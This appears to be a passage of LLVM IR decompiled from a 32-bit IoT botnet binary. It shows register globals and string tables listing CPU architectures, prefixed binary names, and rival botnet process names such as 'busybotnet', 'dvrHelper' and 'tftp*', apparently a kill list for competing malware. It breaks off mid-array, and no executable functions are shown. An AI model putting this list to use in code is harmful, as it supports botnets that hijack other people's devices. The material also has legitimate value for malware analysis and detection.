source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8053bf4.2 = global i32 0
@global_var_8053c24.3 = local_unnamed_addr global i32* @global_var_8053bf4.2
@global_var_8052be4.4 = constant i32 0
@global_var_8053bf8.6 = local_unnamed_addr global i32 0
@global_var_8050980.7 = constant [5 x i8] c"mips\00"
@global_var_8050985.8 = constant [7 x i8] c"mips64\00"
@global_var_805098c.9 = constant [7 x i8] c"mipsel\00"
@global_var_8050993.10 = constant [6 x i8] c"sh2eb\00"
@global_var_8050999.11 = constant [7 x i8] c"sh2elf\00"
@global_var_80509a0.12 = constant [4 x i8] c"sh4\00"
@global_var_80509a4.13 = constant [4 x i8] c"x86\00"
@global_var_80509a8.14 = constant [4 x i8] c"arm\00"
@global_var_80509ac.15 = constant [6 x i8] c"armv5\00"
@global_var_80509b2.16 = constant [8 x i8] c"armv4tl\00"
@global_var_80509ba.17 = constant [6 x i8] c"armv4\00"
@global_var_80509c0.18 = constant [6 x i8] c"armv6\00"
@global_var_80509c6.19 = constant [5 x i8] c"i686\00"
@global_var_80509cb.20 = constant [8 x i8] c"powerpc\00"
@global_var_80509d3.21 = constant [13 x i8] c"powerpc440fp\00"
@global_var_80509e0.22 = constant [5 x i8] c"i586\00"
@global_var_80509e5.23 = constant [5 x i8] c"m68k\00"
@global_var_80509ea.24 = constant [6 x i8] c"sparc\00"
@global_var_80509f0.25 = constant [7 x i8] c"x86_64\00"
@global_var_80509f7.26 = constant [11 x i8] c"jackmymips\00"
@global_var_8050a02.27 = constant [13 x i8] c"jackmymips64\00"
@global_var_8050a0f.28 = constant [13 x i8] c"jackmymipsel\00"
@global_var_8050a1c.29 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_8050a28.30 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_8050a35.31 = constant [10 x i8] c"jackmysh4\00"
@global_var_8050a3f.32 = constant [10 x i8] c"jackmyx86\00"
@global_var_8050a49.33 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_8050a55.34 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_8050a63.35 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_8050a6f.36 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_8050a7b.37 = constant [11 x i8] c"jackmyi686\00"
@global_var_8050a86.38 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_8050a94.39 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_8050aa7.40 = constant [11 x i8] c"jackmyi586\00"
@global_var_8050ab2.41 = constant [11 x i8] c"jackmym68k\00"
@global_var_8050abd.42 = constant [12 x i8] c"jackmysparc\00"
@global_var_8050ac9.43 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_8050ad6.44 = constant [11 x i8] c"hackmymips\00"
@global_var_8050ae1.45 = constant [13 x i8] c"hackmymips64\00"
@global_var_8050aee.46 = constant [13 x i8] c"hackmymipsel\00"
@global_var_8050afb.47 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_8050b07.48 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_8050b14.49 = constant [10 x i8] c"hackmysh4\00"
@global_var_8050b1e.50 = constant [10 x i8] c"hackmyx86\00"
@global_var_8050b28.51 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_8050b34.52 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_8050b42.53 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_8050b4e.54 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_8050b5a.55 = constant [11 x i8] c"hackmyi686\00"
@global_var_8050b65.56 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_8050b73.57 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_8050b86.58 = constant [11 x i8] c"hackmyi586\00"
@global_var_8050b91.59 = constant [11 x i8] c"hackmym68k\00"
@global_var_8050b9c.60 = constant [12 x i8] c"hackmysparc\00"
@global_var_8050ba8.61 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_8050bb5.62 = constant [3 x i8] c"b1\00"
@global_var_8050bb8.63 = constant [3 x i8] c"b2\00"
@global_var_8050bbb.64 = constant [3 x i8] c"b3\00"
@global_var_8050bbe.65 = constant [3 x i8] c"b4\00"
@global_var_8050bc1.66 = constant [3 x i8] c"b5\00"
@global_var_8050bc4.67 = constant [3 x i8] c"b6\00"
@global_var_8050bc7.68 = constant [3 x i8] c"b7\00"
@global_var_8050bca.69 = constant [3 x i8] c"b8\00"
@global_var_8050bcd.70 = constant [3 x i8] c"b9\00"
@global_var_8050bd0.71 = constant [4 x i8] c"b10\00"
@global_var_8050bd4.72 = constant [4 x i8] c"b11\00"
@global_var_8050bd8.73 = constant [4 x i8] c"b12\00"
@global_var_8050bdc.74 = constant [4 x i8] c"b13\00"
@global_var_8050be0.75 = constant [4 x i8] c"b14\00"
@global_var_8050be4.76 = constant [4 x i8] c"b15\00"
@global_var_8050be8.77 = constant [4 x i8] c"b16\00"
@global_var_8050bec.78 = constant [4 x i8] c"b17\00"
@global_var_8050bf0.79 = constant [4 x i8] c"b18\00"
@global_var_8050bf4.80 = constant [4 x i8] c"b19\00"
@global_var_8050bf8.81 = constant [4 x i8] c"b20\00"
@global_var_8050bfc.82 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8050c0d.83 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_8050c16.84 = constant [10 x i8] c"dvrHelper\00"
@global_var_8050c20.85 = constant [8 x i8] c"FDFDHFC\00"
@global_var_8050c28.86 = constant [5 x i8] c"FEUB\00"
@global_var_8050c2d.87 = constant [9 x i8] c"FTUdftui\00"
@global_var_8050c36.88 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8050c3f.89 = constant [6 x i8] c"jhUOH\00"
@global_var_8050c45.90 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8050c4e.91 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_8050c58.92 = constant [8 x i8] c"kmymips\00"
@global_var_8050c60.93 = constant [10 x i8] c"kmymips64\00"
@global_var_8050c6a.94 = constant [10 x i8] c"kmymipsel\00"
@global_var_8050c74.95 = constant [9 x i8] c"kmysh2eb\00"
@global_var_8050c7d.96 = constant [10 x i8] c"kmysh2elf\00"
@global_var_8050c87.97 = constant [7 x i8] c"kmysh4\00"
@global_var_8050c8e.98 = constant [7 x i8] c"kmyx86\00"
@global_var_8050c95.99 = constant [9 x i8] c"kmyarmv5\00"
@global_var_8050c9e.100 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_8050ca9.101 = constant [9 x i8] c"kmyarmv4\00"
@global_var_8050cb2.102 = constant [9 x i8] c"kmyarmv6\00"
@global_var_8050cbb.103 = constant [8 x i8] c"kmyi686\00"
@global_var_8050cc3.104 = constant [11 x i8] c"kmypowerpc\00"
@global_var_8050cce.105 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_8050cde.106 = constant [8 x i8] c"kmyi586\00"
@global_var_8050ce6.107 = constant [8 x i8] c"kmym68k\00"
@global_var_8050cee.108 = constant [9 x i8] c"kmysparc\00"
@global_var_8050cf7.109 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8050d01.110 = constant [8 x i8] c"lolmips\00"
@global_var_8050d09.111 = constant [10 x i8] c"lolmips64\00"
@global_var_8050d13.112 = constant [10 x i8] c"lolmipsel\00"
@global_var_8050d1d.113 = constant [9 x i8] c"lolsh2eb\00"
@global_var_8050d26.114 = constant [10 x i8] c"lolsh2elf\00"
@global_var_8050d30.115 = constant [7 x i8] c"lolsh4\00"
@global_var_8050d37.116 = constant [7 x i8] c"lolx86\00"
@global_var_8050d3e.117 = constant [9 x i8] c"lolarmv5\00"
@global_var_8050d47.118 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_8050d52.119 = constant [9 x i8] c"lolarmv4\00"
@global_var_8050d5b.120 = constant [9 x i8] c"lolarmv6\00"
@global_var_8050d64.121 = constant [8 x i8] c"loli686\00"
@global_var_8050d6c.122 = constant [11 x i8] c"lolpowerpc\00"
@global_var_8050d77.123 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_8050d87.124 = constant [8 x i8] c"loli586\00"
@global_var_8050d8f.125 = constant [8 x i8] c"lolm68k\00"
@global_var_8050d97.126 = constant [9 x i8] c"lolsparc\00"
@global_var_8050da0.127 = constant [8 x i8] c"RYrydry\00"
@global_var_8050da8.128 = constant [8 x i8] c"telmips\00"
@global_var_8050db0.129 = constant [10 x i8] c"telmips64\00"
@global_var_8050dba.130 = constant [10 x i8] c"telmipsel\00"
@global_var_8050dc4.131 = constant [9 x i8] c"telsh2eb\00"
@global_var_8050dcd.132 = constant [10 x i8] c"telsh2elf\00"
@global_var_8050dd7.133 = constant [7 x i8] c"telsh4\00"
@global_var_8050dde.134 = constant [7 x i8] c"telx86\00"
@global_var_8050de5.135 = constant [9 x i8] c"telarmv5\00"
@global_var_8050dee.136 = constant [11 x i8] c"telarmv4tl\00"
@global_var_8050df9.137 = constant [9 x i8] c"telarmv4\00"
@global_var_8050e02.138 = constant [9 x i8] c"telarmv6\00"
@global_var_8050e0b.139 = constant [8 x i8] c"teli686\00"
@global_var_8050e13.140 = constant [11 x i8] c"telpowerpc\00"
@global_var_8050e1e.141 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_8050e2e.142 = constant [8 x i8] c"teli586\00"
@global_var_8050e36.143 = constant [8 x i8] c"telm68k\00"
@global_var_8050e3e.144 = constant [9 x i8] c"telsparc\00"
@global_var_8050e47.145 = constant [10 x i8] c"telx86_64\00"
@global_var_8050e51.146 = constant [12 x i8] c"TwoFacemips\00"
@global_var_8050e5d.147 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_8050e6b.148 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_8050e79.149 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_8050e86.150 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_8050e94.151 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_8050e9f.152 = constant [11 x i8] c"TwoFacex86\00"
@global_var_8050eaa.153 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_8050eb7.154 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_8050ec6.155 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_8050ed3.156 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_8050ee0.157 = constant [12 x i8] c"TwoFacei686\00"
@global_var_8050eec.158 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_8050efb.159 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_8050f0f.160 = constant [12 x i8] c"TwoFacei586\00"
@global_var_8050f1b.161 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_8050f27.162 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_8050f34.163 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_8050f42.164 = constant [9 x i8] c"UYyuyioy\00"
@global_var_8050f4b.165 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_8050f54.166 = constant [5 x i8] c"xxb1\00"
@global_var_8050f59.167 = constant [5 x i8] c"xxb2\00"
@global_var_8050f5e.168 = constant [5 x i8] c"xxb3\00"
@global_var_8050f63.169 = constant [5 x i8] c"xxb4\00"
@global_var_8050f68.170 = constant [5 x i8] c"xxb5\00"
@global_var_8050f6d.171 = constant [5 x i8] c"xxb6\00"
@global_var_8050f72.172 = constant [5 x i8] c"xxb7\00"
@global_var_8050f77.173 = constant [5 x i8] c"xxb8\00"
@global_var_8050f7c.174 = constant [5 x i8] c"xxb9\00"
@global_var_8050f81.175 = constant [6 x i8] c"xxb10\00"
@global_var_8050f87.176 = constant [6 x i8] c"xxb11\00"
@global_var_8050f8d.177 = constant [6 x i8] c"xxb12\00"
@global_var_8050f93.178 = constant [6 x i8] c"xxb13\00"
@global_var_8050f99.179 = constant [6 x i8] c"xxb14\00"
@global_var_8050f9f.180 = constant [6 x i8] c"xxb15\00"
@global_var_8050fa5.181 = constant [6 x i8] c"xxb16\00"
@global_var_8050fab.182 = constant [6 x i8] c"xxb17\00"
@global_var_8050fb1.183 = constant [6 x i8] c"xxb18\00"
@global_var_8050fb7.184 = constant [6 x i8] c"xxb19\00"
@global_var_8050fbd.185 = constant [6 x i8] c"xxb20\00"
@global_var_8050fc3.186 = constant i32 3276849
@global_var_8050fc5.187 = constant i32 3342386
@global_var_8050fc7.188 = constant i32 3407923
@global_var_8050fc9.189 = constant i32 3473460
@global_var_8050fcb.190 = constant i32 3538997
@global_var_8050fcd.191 = constant i32 3604534
@global_var_8050fcf.192 = constant i32 3670071
@global_var_8050fd1.193 = constant i32 3735608
@global_var_8050fd3.194 = constant i32 808517689
@global_var_8050fd5.195 = constant [3 x i8] c"10\00"
@global_var_8050fd8.196 = constant [3 x i8] c"11\00"
@global_var_8050fdb.197 = constant [3 x i8] c"12\00"
@global_var_8050fde.198 = constant [3 x i8] c"13\00"
@global_var_8050fe1.199 = constant [3 x i8] c"14\00"
@global_var_8050fe4.200 = constant [3 x i8] c"15\00"
@global_var_8050fe7.201 = constant [3 x i8] c"16\00"
@global_var_8050fea.202 = constant [3 x i8] c"17\00"
@global_var_8050fed.203 = constant [3 x i8] c"18\00"
@global_var_8050ff0.204 = constant [3 x i8] c"19\00"
@global_var_8050ff3.205 = constant [3 x i8] c"20\00"
@global_var_8050ff6.206 = constant [3 x i8] c"bb\00"
@global_var_8050ff9.207 = constant [11 x i8] c"busybotnet\00"
@global_var_8051004.208 = constant [5 x i8] c"pppd\00"
@global_var_8051009.209 = constant [6 x i8] c"pppoe\00"
@global_var_805100f.210 = constant [5 x i8] c"wput\00"
@global_var_8051014.211 = constant [3 x i8] c"B1\00"
@global_var_8051017.212 = constant [3 x i8] c"B2\00"
@global_var_805101a.213 = constant [3 x i8] c"B3\00"
@global_var_805101d.214 = constant [3 x i8] c"B4\00"
@global_var_8051020.215 = constant [3 x i8] c"B5\00"
@global_var_8051023.216 = constant [3 x i8] c"B6\00"
@global_var_8051026.217 = constant [3 x i8] c"B7\00"
@global_var_8051029.218 = constant [3 x i8] c"B8\00"
@global_var_805102c.219 = constant [3 x i8] c"B9\00"
@global_var_805102f.220 = constant [4 x i8] c"B10\00"
@global_var_8051033.221 = constant [4 x i8] c"B11\00"
@global_var_8051037.222 = constant [4 x i8] c"B12\00"
@global_var_805103b.223 = constant [4 x i8] c"B13\00"
@global_var_805103f.224 = constant [4 x i8] c"B14\00"
@global_var_8051043.225 = constant [4 x i8] c"B15\00"
@global_var_8051047.226 = constant [4 x i8] c"B16\00"
@global_var_805104b.227 = constant [4 x i8] c"B17\00"
@global_var_805104f.228 = constant [4 x i8] c"B18\00"
@global_var_8051053.229 = constant [9 x i8] c"B20hackz\00"
@global_var_805105c.230 = constant [5 x i8] c"bin*\00"
@global_var_8051061.231 = constant [5 x i8] c"gtop\00"
@global_var_8051066.232 = constant [5 x i8] c"ftp*\00"
@global_var_805106b.233 = constant [6 x i8] c"tftp*\00"
@global_var_8051071.234 = constant [7 x i8] c"botnet\00"
@global_var_8051078.235 = constant [8 x i8] c"swatnet\00"
@global_var_8051080.236 = constant [8 x i8] c"ballpit\00"
@global_var_8051088.237 = constant [8 x i8] c"fucknet\00"
@global_var_8051090.238 = constant [9 x i8] c"cracknet\00"
@global_var_8051099.239 = constant [8 x i8] c"weednet\00"
@global_var_80510a1.240 = constant [7 x i8] c"gaynet\00"
@global_var_80510a8.241 = constant [9 x i8] c"queernet\00"
@global_var_80510b1.242 = constant [8 x i8] c"ballnet\00"
@global_var_80510b9.243 = constant [5 x i8] c"unet\00"
@global_var_80510be.244 = constant [7 x i8] c"yougay\00"
@global_var_80510c5.245 = constant [7 x i8] c"sttftp\00"
@global_var_80510cc.246 = constant [7 x i8] c"sstftp\00"
@global_var_80510d3.247 = constant [7 x i8] c"sbtftp\00"
@global_var_80510da.248 = constant [6 x i8] c"btftp\00"
@global_var_80510e0.249 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_80510e9.250 = constant [6 x i8] c"bruv*\00"
@global_var_80510ef.251 = constant [5 x i8] c"IoT*\00"
@global_var_8053c40.252 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050980.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050985.8, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805098c.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050993.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050999.11, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80509a0.12, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80509a4.13, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80509a8.14, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80509ac.15, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80509b2.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80509ba.17, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80509c0.18, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80509c6.19, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80509cb.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80509d3.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80509e0.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80509e5.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80509ea.24, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80509f0.25, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80509f7.26, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050a02.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050a0f.28, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050a1c.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050a28.30, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050a35.31, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050a3f.32, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050a49.33, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050a55.34, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050a63.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050a6f.36, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050a7b.37, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050a86.38, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8050a94.39, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050aa7.40, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050ab2.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050abd.42, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ac9.43, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050ad6.44, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ae1.45, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050aee.46, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050afb.47, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050b07.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050b14.49, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050b1e.50, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050b28.51, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050b34.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050b42.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050b4e.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050b5a.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050b65.56, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8050b73.57, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050b86.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050b91.59, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050b9c.60, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ba8.61, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bb5.62, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bb8.63, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bbb.64, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bbe.65, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bc1.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bc4.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bc7.68, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bca.69, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050bcd.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bd0.71, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bd4.72, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bd8.73, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bdc.74, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050be0.75, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050be4.76, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050be8.77, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bec.78, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bf0.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bf4.80, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8050bf8.81, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8050bfc.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c0d.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c16.84, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050c20.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050c28.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c2d.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c36.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050c3f.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c45.90, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c4e.91, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050c58.92, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c60.93, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c6a.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c74.95, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050c7d.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050c87.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050c8e.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050c95.99, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050c9e.100, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050ca9.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050cb2.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050cbb.103, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050cc3.104, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8050cce.105, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050cde.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050ce6.107, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050cee.108, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050cf7.109, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050d01.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050d09.111, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050d13.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050d1d.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050d26.114, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050d30.115, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050d37.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050d3e.117, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050d47.118, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050d52.119, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050d5b.120, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050d64.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050d6c.122, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8050d77.123, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050d87.124, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050d8f.125, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050d97.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050da0.127, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050da8.128, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050db0.129, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050dba.130, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050dc4.131, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050dcd.132, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050dd7.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8050dde.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050de5.135, i32 0, i32 0), i8* getelementptr inbounds ([11 